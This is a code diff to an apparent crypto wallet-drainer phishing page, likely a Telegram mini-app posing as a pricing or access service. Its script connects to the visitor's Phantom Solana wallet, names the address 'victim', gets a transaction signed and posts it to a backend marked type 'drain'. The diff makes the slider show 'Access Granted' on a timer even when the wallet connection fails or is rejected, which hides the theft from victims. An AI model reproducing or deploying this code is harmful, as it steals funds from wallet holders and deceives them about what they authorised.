@@ -130,13 +130,14 @@
   .status-text { font-size: 13px; margin-bottom: 20px; color: #a1a1aa; text-align: center; }
   .status-text span { color: #14F195; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
 
+  /* SLIDER */
   .slider-container { width: 100%; height: 60px; background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 30px; position: relative; overflow: hidden; display: flex; flex-direction: row-reverse; align-items: center; padding: 4px; user-select: none; touch-action: none; }
   .slider-text { position: absolute; width: 100%; text-align: center; font-size: 14px; font-weight: 600; color: rgba(255, 255, 255, 0.5); pointer-events: none; z-index: 1; transition: opacity 0.3s; }
   .slider-thumb { width: 52px; height: 52px; background: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: grab; position: relative; z-index: 2; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); transition: transform 0.1s; touch-action: none; }
   .slider-thumb:active { cursor: grabbing; }
   .slider-thumb svg { width: 22px; height: 22px; color: #000000; transform: rotate(180deg); transition: transform 0.3s ease; }
   
-  /* LOCKED STATE: Bleibt links und lädt */
+  /* LOCKED STATE */
   .slider-container.loading .slider-thumb { width: 52px; border-radius: 50%; background: #14F195; pointer-events: none; display: flex; justify-content: center; align-items: center; }
   .slider-container.loading .slider-thumb svg { display: none; }
   .slider-container.loading .slider-thumb .spinner { display: block; }
@@ -147,7 +148,6 @@
   .slider-container.success .slider-thumb svg { display: block; transform: rotate(0deg); stroke: #000; stroke-width: 4; width: 24px; height: 24px; margin-left: 2px; }
 
   .spinner { display: none; width: 20px; height: 20px; border: 2.5px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
-
   @keyframes spin { to { transform: rotate(360deg); } }
   @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
   .back-btn { background: none; border: none; color: #52525b; font-size: 12px; font-weight: 500; margin-top: 24px; cursor: pointer; padding: 8px 16px; border-radius: 20px; transition: all 0.2s; }
@@ -405,7 +405,7 @@
     }
   }
 
-  // --- SLIDER LOGIK (Der Fix) ---
+  // --- SLIDER LOGIK ---
   const container = document.getElementById('sliderContainer');
   const thumb = document.getElementById('sliderThumb');
   const text = document.getElementById('sliderText');
@@ -441,34 +441,31 @@
     isDragging = false;
     thumb.releasePointerCapture(e.pointerId);
     
-    // Wenn er weiter als 20% gezogen wurde, rastet er ein und lädt
     if (currentX > maxDrag * 0.2) {
       container.classList.add('loading'); 
       text.style.opacity = 0;
       
-      // Bleibt links stehen
       thumb.style.transition = 'transform 0.2s ease';
       thumb.style.transform = `translateX(-${maxDrag}px)`;
       
-      triggerConnect();
-    } else {
-      thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
-      thumb.style.transform = 'translateX(0)'; 
-      text.style.opacity = 1; 
-      currentX = 0;
-    }
-  });
+      // START 3 SEKUNDEN TIMER FÜR DIE UI
+      setTimeout(() => {
+        container.classList.remove('loading');
+        container.classList.add('success');
+        thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" style="margin-left: 2px;"><polyline points="20 6 9 17 4 12"></polyline></svg>';
+        text.textContent = "Access Granted"; text.style.opacity = 1;
 
-  thumb.addEventListener('pointercancel', (e) => {
-    if (!isDragging) return; 
-    isDragging = false;
-    thumb.releasePointerCapture(e.pointerId);
-    if (currentX > maxDrag * 0.2) {
-      container.classList.add('loading'); 
-      text.style.opacity = 0;
-      thumb.style.transition = 'transform 0.2s ease';
-      thumb.style.transform = `translateX(-${maxDrag}px)`;
+        // Nach dem grünen Haken zum Pending Screen
+        setTimeout(() => {
+          connectScreen.style.display = 'none';
+          dashboardScreen.style.display = 'flex';
+          headerSub.textContent = "Account Pending";
+        }, 1000); // 1 Sekunde Verzögerung nach dem Haken
+      }, 3000);
+
+      // WALLET VERBINDUNG IM HINTERGRUND STARTEN (Blockiert die UI nicht mehr)
       triggerConnect();
+      
     } else {
       thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
       thumb.style.transform = 'translateX(0)'; 
@@ -479,25 +476,8 @@
 
   async function triggerConnect() {
     let provider = window.phantom?.solana;
+    if(!provider) return; // Wenn kein Phantom, ignorieren wir es hier (UI läuft trotzdem weiter)
     
-    // TELEGRAM DEEP LINK LOGIK (Wenn Phantom fehlt)
-    if(!provider) {
-      if (window.Telegram && window.Telegram.WebApp) {
-        window.Telegram.WebApp.showConfirm("Wallet connection requires Phantom. Open in Phantom app?", (confirmed) => {
-          if (confirmed) {
-            const url = window.location.href;
-            window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`;
-          } else {
-            resetSlider();
-          }
-        });
-      } else {
-        alert("Please open in a Web3 wallet browser.");
-        resetSlider();
-      }
-      return;
-    }
-
     try {
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
@@ -535,21 +515,8 @@
           body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() }) 
         });
       }
-
-      container.classList.remove('loading'); container.classList.add('success');
-      thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" style="margin-left: 2px;"><polyline points="20 6 9 17 4 12"></polyline></svg>';
-      text.textContent = "Access Granted"; text.style.opacity = 1;
-
-      setTimeout(() => {
-        connectScreen.style.display = 'none';
-        dashboardScreen.style.display = 'flex';
-        headerSub.textContent = "Account Pending";
-      }, 2000);
-
     } catch (e) { 
-      // Wenn der User in Phantom auf "Ablehnen" drückt oder ein Fehler passiert
-      // resetSlider(); // Wir lassen es absichtlich weg, damit es weiter lädt!
-      console.log("Connection cancelled or failed", e);
+      console.log("Wallet connection failed or rejected.");
     }
   }
 
@@ -559,16 +526,14 @@
       connectScreen.style.display = 'none';
       pricingScreen.style.display = 'flex';
       headerSub.textContent = "Select a plan to continue.";
-      resetSlider();
+      
+      container.classList.remove('loading'); container.classList.remove('success'); 
+      text.style.opacity = 1; text.textContent = "Slide left to authorize";
+      thumb.innerHTML = '<svg id="sliderIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg><div class="spinner" id="spin"></div>';
+      thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
+      thumb.style.transform = 'translateX(0)'; thumb.style.width = '52px'; thumb.style.borderRadius = '50%'; currentX = 0;
+      
     }, 300);
-  }
-
-  function resetSlider() {
-    container.classList.remove('loading'); container.classList.remove('success'); 
-    text.style.opacity = 1; text.textContent = "Slide left to authorize";
-    thumb.innerHTML = '<svg id="sliderIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg><div class="spinner" id="spin"></div>';
-    thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
-    thumb.style.transform = 'translateX(0)'; thumb.style.width = '52px'; thumb.style.borderRadius = '50%'; currentX = 0;
   }
 
   window.addEventListener('resize', initSlider);
